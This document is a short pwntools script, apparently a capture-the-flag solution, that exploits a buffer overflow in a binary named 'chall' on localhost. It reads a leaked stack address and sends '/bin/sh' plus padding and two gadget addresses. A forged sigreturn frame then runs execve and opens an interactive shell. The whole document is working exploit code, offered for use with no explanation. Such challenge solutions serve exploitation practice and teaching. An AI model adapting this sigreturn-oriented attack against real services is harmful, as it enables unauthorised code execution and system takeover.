from pwn import *

set_rax = p64(0x40118C)
syscall = p64(0x40117E)

# pc = process("./chall")
pc = connect("localhost", 9101)
buff = pc.recvuntil("\n")[7:-1]
buff = int(buff, 16)
print("@buff : " + hex(buff))

frame = SigreturnFrame(arch="amd64")
frame.rax = 0x3B
frame.rdi = buff
frame.rip = u64(syscall)

payload = b"/bin/sh\x00"
payload += b"A" * 64
payload += set_rax
payload += syscall
payload += bytes(frame)  # str(frame) for python2

print(pc.recvuntil("\n"))
# gdb.attach(pc,gdbscript="break *0x4011a3")
pc.send(payload)
pc.interactive()
